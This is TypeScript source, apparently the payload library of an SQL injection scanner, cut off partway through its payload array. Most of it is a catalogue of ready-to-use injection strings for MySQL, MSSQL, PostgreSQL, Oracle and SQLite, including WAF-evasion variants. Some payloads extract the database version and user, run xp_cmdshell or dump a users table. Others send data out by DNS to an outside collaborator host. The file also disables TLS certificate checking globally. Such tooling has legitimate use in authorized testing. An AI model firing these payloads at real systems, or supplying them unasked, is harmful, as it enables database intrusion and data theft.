// ─── SQL Injection Engine v3 ────────────────────────────────────────────────────
// Authorized security research / bug bounty use only.
// Detects SQL injection via error, boolean-blind, time-based, UNION, stacked, OOB.

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ── Error signatures per database ─────────────────────────────────────────────
export const DB_ERROR_SIGNATURES: Record<string, RegExp[]> = {
  MySQL: [
    /you have an error in your sql syntax/i,
    /warning:\s*mysqli?/i,
    /unclosed quotation mark after the character string/i,
    /mysql_fetch_array\(\)/i,
    /mysql_numrows\(\)/i,
    /supplied argument is not a valid mysql result/i,
    /column count doesn't match value count/i,
    /unknown column .+ in 'field list'/i,
    /com\.mysql\.jdbc/i,
    /org\.hibernate\.QueryException/i,
    /\[MySQL\]\[ODBC/i,
    /SQL syntax.*MySQL/i,
    /mysql_connect\(\)/i,
    /mysql_query\(\)/i,
    /mysql_result\(\)/i,
    /mysqli_fetch/i,
    /check the manual that (corresponds|belongs) to your (MySQL|MariaDB)/i,
    /You have an error in your SQL/i,
    /FUNCTION .+ does not exist/i,
    /Operand should contain 1 column/i,
  ],
  PostgreSQL: [
    /pg_query\(\)/i,
    /pg_exec\(\)/i,
    /PostgreSQL.*ERROR/i,
    /ERROR:\s+syntax error at or near/i,
    /ERROR:\s+unterminated quoted string/i,
    /ERROR:\s+invalid input syntax for/i,
    /org\.postgresql\.util\.PSQLException/i,
    /\[PostgreSQL\]/i,
    /PSQLException/i,
    /pgsql_query/i,
    /DETAIL:\s+.+ERROR/i,
    /ERROR: column .+ does not exist/i,
    /ERROR: relation .+ does not exist/i,
    /invalid byte sequence for encoding/i,
  ],
  MSSQL: [
    /microsoft sql server/i,
    /sql server.*error/i,
    /OLE DB.*SQL Server/i,
    /\[SQL Server\]/i,
    /Unclosed quotation mark after the character string/i,
    /Incorrect syntax near/i,
    /mssql_query\(\)/i,
    /odbc_exec\(\)/i,
    /System\.Data\.SqlClient/i,
    /SqlException/i,
    /ADODB\.Field/i,
    /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
    /sqlsrv_query/i,
    /Msg \d+, Level \d+/i,
    /Conversion failed when converting/i,
    /Arithmetic overflow error/i,
  ],
  Oracle: [
    /ORA-\d{4,}/i,
    /oracle.*driver/i,
    /oracle.*error/i,
    /quoted string not properly terminated/i,
    /OracleException/i,
    /oracle\.jdbc/i,
    /ORA-00907/i,
    /ORA-00911/i,
    /ORA-00942/i,
    /ORA-01017/i,
    /ORA-01722/i,
    /ORA-06550/i,
    /TNS:listener/i,
    /PLS-\d{5}/i,
    /SP2-\d{4}/i,
  ],
  SQLite: [
    /SQLite.*error/i,
    /sqlite3\.\w+\(\)/i,
    /\[SQLITE_/i,
    /no such table/i,
    /SQLiteException/i,
    /SQLITE_ERROR/i,
    /near ".*": syntax error/i,
    /unrecognized token/i,
  ],
  Generic: [
    /sql syntax/i,
    /syntax error/i,
    /database error/i,
    /sql error/i,
    /query failed/i,
    /\bpdoexception\b/i,
    /databaseexception/i,
    /queryexception/i,
    /invalidquerysyntaxexception/i,
    /unterminated string literal/i,
    /unexpected end of sql command/i,
    /warning: pg_/i,
    /invalid sql/i,
    /bad sql grammar/i,
    /SqlSyntaxErrorException/i,
    /JdbcSQLException/i,
    /java\.sql\.SQLException/i,
    /org\.springframework\.dao/i,
    /DBD::mysql::st/i,
    /Zend_Db_Statement_Exception/i,
    /Doctrine\\DBAL/i,
    /SQLAlchemy/i,
    /Error Executing Database Query/i,
  ],
};

export type DbType = 'MySQL' | 'PostgreSQL' | 'MSSQL' | 'Oracle' | 'SQLite' | 'Unknown';

export function detectDbType(html: string): DbType {
  for (const [db, patterns] of Object.entries(DB_ERROR_SIGNATURES)) {
    if (db === 'Generic') continue;
    if (patterns.some(p => p.test(html))) return db as DbType;
  }
  if (DB_ERROR_SIGNATURES.Generic.some(p => p.test(html))) return 'Unknown';
  return 'Unknown';
}

export function detectSqlError(html: string): { found: boolean; dbType: DbType; evidence: string } {
  for (const [db, patterns] of Object.entries(DB_ERROR_SIGNATURES)) {
    for (const p of patterns) {
      const m = html.match(p);
      if (m) {
        const idx = html.indexOf(m[0]);
        const evidence = html.slice(Math.max(0, idx - 60), Math.min(html.length, idx + m[0].length + 150)).trim();
        return { found: true, dbType: (db === 'Generic' ? 'Unknown' : db) as DbType, evidence };
      }
    }
  }
  return { found: false, dbType: 'Unknown', evidence: '' };
}

// ── Detection payloads ─────────────────────────────────────────────────────────
export interface SqliProbe {
  payload: string;
  technique: 'error' | 'boolean' | 'time' | 'union' | 'stacked' | 'oob';
  wafBypass: string;
  dbHint: DbType | 'Any';
  description: string;
  fast?: boolean; // included in fast-mode scan
}

const P = (payload: string, technique: SqliProbe['technique'], wafBypass: string, dbHint: DbType | 'Any', description: string, fast = false): SqliProbe =>
  ({ payload, technique, wafBypass, dbHint, description, fast });

export const SQLI_PROBES: SqliProbe[] = [

  // ════════════════════════════════════════════════════════════════════════════
  // ERROR-BASED — Basic break chars
  // ════════════════════════════════════════════════════════════════════════════
  P(`'`,                          'error', 'none',          'Any',       'Single quote', true),
  P(`''`,                         'error', 'none',          'Any',       'Double single quote'),
  P(`"`,                          'error', 'none',          'Any',       'Double quote', true),
  P(`\``,                         'error', 'none',          'MySQL',     'Backtick'),
  P(`')`,                         'error', 'none',          'Any',       'Close paren quote', true),
  P(`"))`,                        'error', 'none',          'Any',       'Double close paren DQ'),
  P(`'))`,                        'error', 'none',          'Any',       'Double close paren SQ'),
  P(`'--`,                        'error', 'none',          'Any',       'Comment-out rest'),
  P(`'-- -`,                      'error', 'none',          'MySQL',     'MySQL dash-space comment'),
  P(`' #`,                        'error', 'none',          'MySQL',     'MySQL hash comment'),
  P(`'/*`,                        'error', 'none',          'Any',       'C-style comment opener'),
  P(`1'`,                         'error', 'none',          'Any',       'Numeric context break'),
  P(`1"`,                         'error', 'none',          'Any',       'Numeric context DQ'),
  P(`\\'`,                        'error', 'backslash',     'MySQL',     'Backslash escape'),
  P(`%27`,                        'error', 'url_encode',    'Any',       'URL-encoded quote', true),
  P(`%2527`,                      'error', 'double_url',    'Any',       'Double URL-encoded quote'),
  P(`&#039;`,                     'error', 'html_entity',   'Any',       'HTML entity quote'),
  P(`%00'`,                       'error', 'null_byte',     'Any',       'Null byte before quote'),

  // ─── ERROR-BASED — MySQL advanced ─────────────────────────────────────────
  P(`' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -`,
    'error', 'none', 'MySQL', 'MySQL EXTRACTVALUE XML error', true),
  P(`' AND updatexml(1,concat(0x7e,database()),1)-- -`,
    'error', 'none', 'MySQL', 'MySQL UPDATEXML XML error', true),
  P(`' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`,
    'error', 'none', 'MySQL', 'MySQL duplicate key rand() error'),
  P(`' AND exp(~(SELECT*from(SELECT version())x))-- -`,
    'error', 'none', 'MySQL', 'MySQL exp() double overflow error'),
  P(`' AND GeometryCollection((select*from(select*from(select version())f)x))-- -`,
    'error', 'none', 'MySQL', 'MySQL GeometryCollection error'),
  P(`' AND polygon((select*from(select*from(select version())f)x))-- -`,
    'error', 'none', 'MySQL', 'MySQL Polygon error'),
  P(`' OR 1=1 INTO OUTFILE '/tmp/sqlitest'-- -`,
    'error', 'none', 'MySQL', 'MySQL SELECT INTO OUTFILE error (no FILE priv)'),
  P(`' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`,
    'error', 'none', 'MySQL', 'MySQL DB name via RAND error'),
  P(`' AND extractvalue(1,concat(char(126),version(),char(126)))-- -`,
    'error', 'none', 'MySQL', 'MySQL EXTRACTVALUE with char()'),
  P(`'+(select*from(select(sleep(0)))a)+EXTRACTVALUE(0x0a,concat(0x0a,version()))+'`,
    'error', 'none', 'MySQL', 'MySQL EXTRACTVALUE combined'),

  // ─── ERROR-BASED — MSSQL ──────────────────────────────────────────────────
  P(`' AND 1=CONVERT(int,@@version)-- -`,
    'error', 'none', 'MSSQL', 'MSSQL CONVERT type error', true),
  P(`' AND 1=CAST(@@version AS int)-- -`,
    'error', 'none', 'MSSQL', 'MSSQL CAST type error', true),
  P(`' AND 1=CAST(DB_NAME() AS int)-- -`,
    'error', 'none', 'MSSQL', 'MSSQL DB_NAME as int'),
  P(`'; DECLARE @q NVARCHAR(4000) SET @q='SELECT 1' EXEC(@q)-- -`,
    'error', 'none', 'MSSQL', 'MSSQL dynamic exec error'),
  P(`' HAVING 1=1-- -`,
    'error', 'none', 'MSSQL', 'MSSQL HAVING clause error', true),
  P(`' GROUP BY 1-- -`,
    'error', 'none', 'MSSQL', 'MSSQL GROUP BY without aggregate'),
  P(`' AND 1=CONVERT(int,SYSTEM_USER)-- -`,
    'error', 'none', 'MSSQL', 'MSSQL SYSTEM_USER as int'),

  // ─── ERROR-BASED — PostgreSQL ─────────────────────────────────────────────
  P(`' AND 1=CAST(version() AS int)-- -`,
    'error', 'none', 'PostgreSQL', 'PgSQL CAST version as int', true),
  P(`'||CAST(1/0 AS text)||'`,
    'error', 'none', 'PostgreSQL', 'PgSQL division by zero'),
  P(`' AND 1=CAST(current_database() AS integer)-- -`,
    'error', 'none', 'PostgreSQL', 'PgSQL current_database as int'),
  P(`'; SELECT version()::int-- -`,
    'error', 'none', 'PostgreSQL', 'PgSQL version cast stacked'),

  // ─── ERROR-BASED — Oracle ─────────────────────────────────────────────────
  P(`' AND 1=CTXSYS.DRITHSX.SN(user,0)-- -`,
    'error', 'none', 'Oracle', 'Oracle CTXSYS error'),
  P(`' AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||user||chr(62))) FROM dual)-- -`,
    'error', 'none', 'Oracle', 'Oracle XMLType error'),
  P(`' AND 1=(SELECT dbms_xmlgen.getxml('select user from dual') FROM dual)-- -`,
    'error', 'none', 'Oracle', 'Oracle dbms_xmlgen error', true),
  P(`' UNION SELECT user FROM dual-- -`,
    'error', 'none', 'Oracle', 'Oracle dual table probe', true),

  // ─── ERROR-BASED — WAF bypass variants ────────────────────────────────────
  P(`'/**/AND/**/EXTRACTVALUE(1,CONCAT(0x7e,(SELECT/**/version())))-- -`,
    'error', 'comment_padding', 'MySQL', 'EXTRACTVALUE comment-padded bypass'),
  P(`'%0aAND%0aEXTRACTVALUE(1,CONCAT(0x7e,(SELECT%0aversion())))-- -`,
    'error', 'newline_encode', 'MySQL', 'EXTRACTVALUE newline bypass'),
  P(`'/*!50000AND*//*!50000EXTRACTVALUE*/(1,CONCAT(0x7e,version()))-- -`,
    'error', 'inline_comment', 'MySQL', 'MySQL versioned comment EXTRACTVALUE'),
  P(`'+AND+EXTRACTVALUE(1,CONCAT(0x7e,(SELECT+version())))-- -`,
    'error', 'plus_space', 'MySQL', 'EXTRACTVALUE plus-space bypass'),

  // ════════════════════════════════════════════════════════════════════════════
  // BOOLEAN-BASED BLIND — True/False pairs
  // ════════════════════════════════════════════════════════════════════════════
  // True conditions
  P(`' OR '1'='1`,                 'boolean', 'none',     'Any',   'Classic always-true string', true),
  P(`' OR 1=1-- -`,                'boolean', 'none',     'Any',   'Numeric always-true', true),
  P(`' OR 1-- -`,                  'boolean', 'none',     'Any',   'Truthy OR 1'),
  P(`1 OR 1=1`,                    'boolean', 'none',     'Any',   'Numeric context always-true', true),
  P(`' OR 'x'='x`,                 'boolean', 'none',     'Any',   'String equality true'),
  P(`') OR ('1'='1`,               'boolean', 'none',     'Any',   'Bracket boolean true'),
  P(`' OR 1=1#`,                   'boolean', 'hash_comment', 'MySQL', 'MySQL hash boolean'),
  P(`'||'1'='1`,                   'boolean', 'concat_op','Oracle','Oracle concat bypass'),
  P(`' OR/**/1=1-- -`,             'boolean', 'comment_padding', 'Any', 'Comment-padded OR true'),
  P(`' oR '1'='1`,                 'boolean', 'case_variation', 'Any', 'Case variation true'),
  P(`' OR 0x31=0x31-- -`,          'boolean', 'hex_encode', 'MySQL', 'Hex comparison true'),
  P(`' OR ASCII(1)=49-- -`,        'boolean', 'function_wrap', 'Any', 'ASCII function true'),
  P(`' OR true-- -`,               'boolean', 'none',     'Any',   'Literal true keyword'),
  P(`' OR 2>1-- -`,                'boolean', 'none',     'Any',   'Greater-than true'),
  P(`' OR 'a'='a'-- -`,            'boolean', 'none',     'Any',   'Char equality true'),
  P(`' OR ISNULL(NULL)-- -`,       'boolean', 'none',     'MySQL', 'ISNULL(NULL) true'),
  P(`' OR IF(1=1,1,0)-- -`,        'boolean', 'none',     'MySQL', 'MySQL IF true'),
  P(`' OR CASE WHEN 1=1 THEN 1 ELSE 0 END-- -`, 'boolean', 'none', 'Any', 'CASE WHEN true'),
  P(`' OR IIF(1=1,1,0)-- -`,       'boolean', 'none',     'MSSQL', 'MSSQL IIF true'),
  P(`' OR 1=1 AND '1'='1`,         'boolean', 'none',     'Any',   'Combined AND/OR true'),
  // False conditions (expected to produce different response)
  P(`' OR '1'='2`,                 'boolean', 'none',     'Any',   'Classic always-false string', true),
  P(`' OR 1=2-- -`,                'boolean', 'none',     'Any',   'Numeric always-false', true),
  P(`1 AND 1=2`,                   'boolean', 'none',     'Any',   'Numeric context always-false', true),
  P(`' OR 'x'='y`,                 'boolean', 'none',     'Any',   'String equality false'),
  P(`') OR ('1'='2`,               'boolean', 'none',     'Any',   'Bracket boolean false'),
  P(`' AND 1=2-- -`,               'boolean', 'none',     'Any',   'AND always-false'),
  P(`' AND false-- -`,             'boolean', 'none',     'Any',   'Literal false keyword'),
  P(`' AND 2>3-- -`,               'boolean', 'none',     'Any',   'Greater-than false'),
  P(`' OR IF(1=2,1,0)-- -`,        'boolean', 'none',     'MySQL', 'MySQL IF false'),
  P(`' OR CASE WHEN 1=2 THEN 1 ELSE 0 END-- -`, 'boolean', 'none', 'Any', 'CASE WHEN false'),

  // ─── BOOLEAN — Substring/length oracle ────────────────────────────────────
  P(`' AND LENGTH(database())>0-- -`,       'boolean', 'none', 'MySQL', 'MySQL DB length > 0'),
  P(`' AND LENGTH(database())>5-- -`,       'boolean', 'none', 'MySQL', 'MySQL DB length > 5'),
  P(`' AND SUBSTRING(version(),1,1)='5'-- -`, 'boolean', 'none', 'MySQL', 'MySQL version starts with 5'),
  P(`' AND SUBSTRING(version(),1,1)='8'-- -`, 'boolean', 'none', 'MySQL', 'MySQL version starts with 8'),
  P(`' AND database() LIKE 'mysql%'-- -`,  'boolean', 'none', 'MySQL', 'MySQL DB name LIKE'),
  P(`' AND MID(version(),1,1)='5'-- -`,    'boolean', 'none', 'MySQL', 'MySQL MID version check'),
  P(`' AND ORD(MID(database(),1,1))>96-- -`,'boolean', 'none', 'MySQL', 'MySQL ORD char check'),
  P(`' AND (SELECT SUBSTRING(user(),1,4))='root'-- -`, 'boolean', 'none', 'MySQL', 'MySQL user root check'),
  P(`' AND (SELECT count(*) FROM information_schema.tables)>5-- -`, 'boolean', 'none', 'MySQL', 'MySQL table count check'),
  P(`' AND (SELECT count(*) FROM information_schema.tables)=0-- -`, 'boolean', 'none', 'MySQL', 'MySQL table count false'),

  // ─── BOOLEAN — MSSQL specific ─────────────────────────────────────────────
  P(`' AND LEN(DB_NAME())>0-- -`,   'boolean', 'none', 'MSSQL', 'MSSQL DB name length'),
  P(`' AND SUBSTRING(@@version,1,1)='M'-- -`, 'boolean', 'none', 'MSSQL', 'MSSQL version M check'),
  P(`'; IF (1=1) SELECT 'a' ELSE SELECT 'b'-- -`, 'boolean', 'none', 'MSSQL', 'MSSQL IF branch'),
  P(`'; IF (SELECT COUNT(*) FROM information_schema.tables)>0 WAITFOR DELAY '0:0:0'-- -`,
    'boolean', 'none', 'MSSQL', 'MSSQL table count check'),

  // ─── BOOLEAN — PostgreSQL specific ────────────────────────────────────────
  P(`' AND length(current_database())>0-- -`,  'boolean', 'none', 'PostgreSQL', 'PgSQL DB length'),
  P(`' AND substr(version(),1,10) LIKE 'PostgreSQL%'-- -`, 'boolean', 'none', 'PostgreSQL', 'PgSQL version check'),

  // ─── BOOLEAN — WAF bypasses ────────────────────────────────────────────────
  P(`'%09OR%09'1'='1`,               'boolean', 'tab_encode',      'Any',  'Tab-encoded OR true'),
  P(`'%0aOR%0a'1'='1`,               'boolean', 'newline_encode',  'Any',  'Newline-encoded OR true'),
  P(`'%0aOR%0a1=1-- -`,              'boolean', 'newline_encode',  'Any',  'Newline OR 1=1', true),
  P(`'+OR+'1'='1`,                   'boolean', 'plus_space',      'Any',  'Plus-encoded OR true'),
  P(`'/*!OR*/1=1-- -`,               'boolean', 'inline_comment',  'MySQL','MySQL conditional comment OR'),
  P(`' OR 1e0=1e0-- -`,              'boolean', 'scientific',      'MySQL','Scientific notation comparison'),
  P(`' OR true#`,                    'boolean', 'hash_comment',    'MySQL','Literal true with hash'),
  P(`' OR 1 BETWEEN 0 AND 2-- -`,   'boolean', 'none',            'Any',  'BETWEEN always-true'),
  P(`' OR 1 IN(1,2,3)-- -`,         'boolean', 'none',            'Any',  'IN clause always-true'),
  P(`' OR NOT 1=2-- -`,             'boolean', 'none',            'Any',  'NOT false = true'),
  P(`' OR !(1=2)-- -`,              'boolean', 'none',            'MySQL','MySQL NOT operator'),
  P(`' OR ~0+1>0-- -`,              'boolean', 'none',            'MySQL','MySQL bitwise NOT true'),

  // ════════════════════════════════════════════════════════════════════════════
  // TIME-BASED BLIND
  // ════════════════════════════════════════════════════════════════════════════
  // MySQL
  P(`' AND SLEEP(5)-- -`,                         'time', 'none',          'MySQL',      'MySQL SLEEP 5s', true),
  P(`' AND SLEEP(5)#`,                            'time', 'hash_comment',  'MySQL',      'MySQL SLEEP hash comment', true),
  P(`' OR SLEEP(5)-- -`,                          'time', 'none',          'MySQL',      'MySQL SLEEP via OR', true),
  P(`1' AND SLEEP(5) AND '1'='1`,                 'time', 'none',          'MySQL',      'MySQL SLEEP string context'),
  P(`' AND (SELECT * FROM (SELECT(SLEEP(5)))A)-- -`, 'time', 'subquery',   'MySQL',      'MySQL SLEEP subquery bypass', true),
  P(`' AND (SELECT 1 FROM (SELECT SLEEP(5))X)-- -`,  'time', 'nested',     'MySQL',      'MySQL SLEEP nested bypass'),
  P(`' OR IF(1=1,SLEEP(5),0)-- -`,               'time', 'if_wrap',       'MySQL',      'MySQL conditional SLEEP'),
  P(`' AND IF(1=1,SLEEP(5),SLEEP(0))-- -`,        'time', 'if_wrap',       'MySQL',      'MySQL IF SLEEP'),
  P(`' AND CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END-- -`, 'time', 'case',   'MySQL',      'MySQL CASE SLEEP'),
  P(`' AND 1=1 UNION SELECT SLEEP(5)-- -`,        'time', 'union',         'MySQL',      'MySQL UNION SLEEP'),
  P(`'AND(SELECT*FROM(SELECT(SLEEP(5)))a)AND'1`,  'time', 'nospace',       'MySQL',      'MySQL SLEEP no-space bypass'),
  P(`' AND SLEEP/**/5/**/-- -`,                   'time', 'comment_padding','MySQL',     'MySQL SLEEP comment-padded'),
  P(`'%09AND%09SLEEP(5)-- -`,                     'time', 'tab_encode',    'MySQL',      'MySQL SLEEP tab-encoded'),
  P(`'%0aAND%0aSLEEP(5)-- -`,                     'time', 'newline_encode','MySQL',      'MySQL SLEEP newline'),
  P(`'+AND+SLEEP(5)-- -`,                         'time', 'plus_space',    'MySQL',      'MySQL SLEEP plus-encoded'),
  P(`' /*!AND*/ /*!SLEEP*/(5)-- -`,               'time', 'inline_comment','MySQL',      'MySQL SLEEP versioned comment'),
  // BENCHMARK (no SLEEP privilege)
  P(`' AND BENCHMARK(10000000,MD5(1))-- -`,        'time', 'none',          'MySQL',      'MySQL BENCHMARK delay', true),
  P(`' OR BENCHMARK(10000000,SHA1(1))-- -`,        'time', 'none',          'MySQL',      'MySQL BENCHMARK OR'),
  P(`' AND (SELECT BENCHMARK(10000000,MD5('test')))-- -`, 'time', 'subquery','MySQL',     'MySQL BENCHMARK subquery'),

  // MSSQL
  P(`'; WAITFOR DELAY '0:0:5'-- -`,              'time', 'none',           'MSSQL',      'MSSQL WAITFOR 5s', true),
  P(`'; IF(1=1) WAITFOR DELAY '0:0:5'-- -`,      'time', 'none',           'MSSQL',      'MSSQL conditional WAITFOR', true),
  P(`'; IF(SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'-- -`, 'time', 'none', 'MSSQL', 'MSSQL users table WAITFOR'),
  P(`'%3B+WAITFOR+DELAY+'0:0:5'-- -`,            'time', 'url_encode',     'MSSQL',      'URL-encoded MSSQL WAITFOR'),
  P(`'; WAITFOR DELAY '0:0:5'-- `,               'time', 'none',           'MSSQL',      'MSSQL WAITFOR no dash'),

  // PostgreSQL
  P(`'; SELECT PG_SLEEP(5)-- -`,                  'time', 'none',           'PostgreSQL', 'PgSQL PG_SLEEP 5s', true),
  P(`' AND (SELECT 1 FROM PG_SLEEP(5))-- -`,       'time', 'none',           'PostgreSQL', 'PgSQL PG_SLEEP AND', true),
  P(`'; SELECT * FROM pg_sleep(5)-- -`,           'time', 'none',           'PostgreSQL', 'PgSQL pg_sleep stacked'),
  P(`' OR (SELECT 1 FROM PG_SLEEP(5))-- -`,        'time', 'none',           'PostgreSQL', 'PgSQL PG_SLEEP OR'),

  // Oracle
  P(`' AND 1=dbms_pipe.receive_message('a',5)-- -`,  'time', 'none', 'Oracle', 'Oracle dbms_pipe 5s', true),
  P(`' OR 1=dbms_pipe.receive_message('a',5)-- -`,   'time', 'none', 'Oracle', 'Oracle dbms_pipe OR'),
  P(`'; EXECUTE dbms_lock.sleep(5)-- -`,             'time', 'none', 'Oracle', 'Oracle dbms_lock sleep'),
  P(`' AND 1=DECODE(1,1,(SELECT dbms_pipe.receive_message('a',5) FROM dual),0)-- -`,
    'time', 'none', 'Oracle', 'Oracle DECODE pipe'),

  // SQLite
  P(`' AND 1=RANDOMBLOB(100000000)-- -`,          'time', 'none', 'SQLite', 'SQLite RANDOMBLOB delay', true),
  P(`' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))-- -`,
    'time', 'none', 'SQLite', 'SQLite RANDOMBLOB LIKE delay'),

  // ════════════════════════════════════════════════════════════════════════════
  // UNION-BASED
  // ════════════════════════════════════════════════════════════════════════════
  // NULL-based probes (1-12 cols)
  P(`' UNION SELECT NULL-- -`,                      'union', 'none', 'Any', '1-col UNION NULL', true),
  P(`' UNION SELECT NULL,NULL-- -`,                 'union', 'none', 'Any', '2-col UNION NULL', true),
  P(`' UNION SELECT NULL,NULL,NULL-- -`,            'union', 'none', 'Any', '3-col UNION NULL', true),
  P(`' UNION SELECT NULL,NULL,NULL,NULL-- -`,       'union', 'none', 'Any', '4-col UNION NULL', true),
  P(`' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -`,  'union', 'none', 'Any', '5-col UNION NULL'),
  P(`' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -`, 'union', 'none', 'Any', '6-col UNION NULL'),
  P(`' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -`, 'union', 'none', 'Any', '7-col UNION NULL'),
  P(`' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -`, 'union', 'none', 'Any', '8-col UNION NULL'),
  P(`' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -`, 'union', 'none', 'Any', '9-col UNION NULL'),
  P(`' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -`, 'union', 'none', 'Any', '10-col UNION NULL'),

  // Integer probes
  P(`' UNION SELECT 1-- -`,                         'union', 'none', 'Any', '1-col UNION int', true),
  P(`' UNION SELECT 1,2-- -`,                       'union', 'none', 'Any', '2-col UNION int', true),
  P(`' UNION SELECT 1,2,3-- -`,                     'union', 'none', 'Any', '3-col UNION int', true),
  P(`' UNION SELECT 1,2,3,4-- -`,                   'union', 'none', 'Any', '4-col UNION int'),
  P(`' UNION SELECT 1,2,3,4,5-- -`,                 'union', 'none', 'Any', '5-col UNION int'),
  P(`' UNION SELECT 1,2,3,4,5,6-- -`,               'union', 'none', 'Any', '6-col UNION int'),
  P(`' UNION SELECT 1,2,3,4,5,6,7-- -`,             'union', 'none', 'Any', '7-col UNION int'),

  // String marker probes (0x414c43414d45 = "ALCAME")
  P(`' UNION SELECT 0x414c43414d45-- -`,            'union', 'none', 'MySQL', '1-col hex marker', true),
  P(`' UNION SELECT 0x414c43414d45,NULL-- -`,       'union', 'none', 'MySQL', '2-col hex marker col1'),
  P(`' UNION SELECT NULL,0x414c43414d45-- -`,       'union', 'none', 'MySQL', '2-col hex marker col2'),
  P(`' UNION SELECT 0x414c43414d45,NULL,NULL-- -`,  'union', 'none', 'MySQL', '3-col hex marker'),
  P(`' UNION SELECT NULL,0x414c43414d45,NULL-- -`,  'union', 'none', 'MySQL', '3-col hex marker col2'),
  P(`' UNION SELECT NULL,NULL,0x414c43414d45-- -`,  'union', 'none', 'MySQL', '3-col hex marker col3'),
  P(`' UNION SELECT 'ALCAME',NULL-- -`,             'union', 'none', 'Any', '2-col string marker'),
  P(`' UNION SELECT 'ALCAME',NULL,NULL-- -`,        'union', 'none', 'Any', '3-col string marker'),
  P(`' UNION SELECT NULL,'ALCAME',NULL-- -`,        'union', 'none', 'Any', '3-col string marker c2'),

  // UNION ALL bypass
  P(`' UNION ALL SELECT NULL-- -`,                  'union', 'union_all',       'Any', '1-col UNION ALL'),
  P(`' UNION ALL SELECT NULL,NULL-- -`,             'union', 'union_all',       'Any', '2-col UNION ALL'),
  P(`' UNION ALL SELECT NULL,NULL,NULL-- -`,        'union', 'union_all',       'Any', '3-col UNION ALL'),
  P(`' UNION ALL SELECT 0x414c43414d45-- -`,        'union', 'union_all',       'MySQL', '1-col UNION ALL hex'),
  P(`' UNION ALL SELECT 'ALCAME',NULL-- -`,         'union', 'union_all',       'Any', '2-col UNION ALL string'),

  // WAF bypass UNION variants
  P(`' UNION/*!32302*/SELECT NULL-- -`,             'union', 'inline_comment',  'MySQL', 'MySQL versioned UNION'),
  P(`' UNION%0aSELECT%0aNULL-- -`,                 'union', 'newline_encode',  'Any', 'Newline UNION bypass'),
  P(`' UNiOn SeLEcT NULL-- -`,                     'union', 'case_variation',  'Any', 'Case variation UNION'),
  P(`' UNION%09SELECT%09NULL-- -`,                  'union', 'tab_encode',      'Any', 'Tab UNION bypass'),
  P(`'/**/UNION/**/SELECT/**/NULL-- -`,             'union', 'comment_padding', 'Any', 'Comment-padded UNION'),
  P(`'+UNION+SELECT+NULL-- -`,                      'union', 'plus_space',      'Any', 'Plus-space UNION'),
  P(`'/*!UNION*//*!SELECT*/NULL-- -`,               'union', 'inline_comment',  'MySQL', 'Double inline comment UNION'),
  P(`' UNION SELECT CHAR(65,76,67,65,77,69)-- -`,  'union', 'char_func',       'MySQL', 'MySQL CHAR() marker'),
  // UNION for Oracle (needs FROM dual)
  P(`' UNION SELECT NULL FROM dual-- -`,            'union', 'none',            'Oracle', 'Oracle 1-col FROM dual'),
  P(`' UNION SELECT NULL,NULL FROM dual-- -`,       'union', 'none',            'Oracle', 'Oracle 2-col FROM dual'),
  P(`' UNION SELECT 'ALCAME' FROM dual-- -`,        'union', 'none',            'Oracle', 'Oracle string marker dual'),

  // ════════════════════════════════════════════════════════════════════════════
  // STACKED QUERIES
  // ════════════════════════════════════════════════════════════════════════════
  P(`'; SELECT 1-- -`,                              'stacked', 'none', 'MSSQL',      'MSSQL stacked probe', true),
  P(`'; SELECT SLEEP(0)-- -`,                       'stacked', 'none', 'MySQL',      'MySQL stacked zero-sleep', true),
  P(`'; SELECT pg_sleep(0)-- -`,                    'stacked', 'none', 'PostgreSQL', 'PgSQL stacked zero-sleep', true),
  P(`'; EXEC xp_cmdshell('ping -n 1 127.0.0.1')-- -`, 'stacked', 'none', 'MSSQL', 'MSSQL xp_cmdshell probe'),
  P(`'; SELECT 1 INTO @var-- -`,                    'stacked', 'none', 'MySQL',      'MySQL variable assignment'),
  P(`'; SELECT COUNT(*) FROM information_schema.tables-- -`, 'stacked', 'none', 'Any', 'Stacked table count'),
  P(`'; DECLARE @v VARCHAR(8000) SET @v=@@version-- -`, 'stacked', 'none', 'MSSQL', 'MSSQL DECLARE variable'),
  P(`'; CREATE TABLE sqlitest(id int)-- -`,         'stacked', 'none', 'Any', 'Stacked CREATE TABLE (denied error)'),
  P(`'; INSERT INTO sqlitest VALUES(1)-- -`,        'stacked', 'none', 'Any', 'Stacked INSERT probe'),
  P(`'; DROP TABLE IF EXISTS sqlitest-- -`,         'stacked', 'none', 'MySQL', 'Stacked DROP IF EXISTS'),
  P(`'\'; SELECT 1-- -`,                            'stacked', 'none', 'MySQL', 'MySQL backslash stacked'),
  P(`%27%3b+SELECT+1-- -`,                         'stacked', 'url_encode', 'Any', 'URL-encoded stacked'),
  P(`'; EXEC('SELECT 1')-- -`,                      'stacked', 'none', 'MSSQL', 'MSSQL EXEC stacked'),
  P(`'; SELECT * FROM users LIMIT 1-- -`,           'stacked', 'none', 'MySQL', 'Stacked user dump'),
  P(`'; SELECT table_name FROM information_schema.tables LIMIT 1-- -`, 'stacked', 'none', 'MySQL', 'Stacked info_schema'),

  // ════════════════════════════════════════════════════════════════════════════
  // OOB (Out-of-Band) — payload markers for confirmed injections
  // ════════════════════════════════════════════════════════════════════════════
  P(`' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.sqlitest.burpcollaborator.net\\\\sqlitest'))-- -`,
    'oob', 'none', 'MySQL', 'MySQL DNS via LOAD_FILE'),
  P(`'; exec master..xp_dirtree '//sqlitest.burpcollaborator.net/a'-- -`,
    'oob', 'none', 'MSSQL', 'MSSQL DNS via xp_dirtree'),
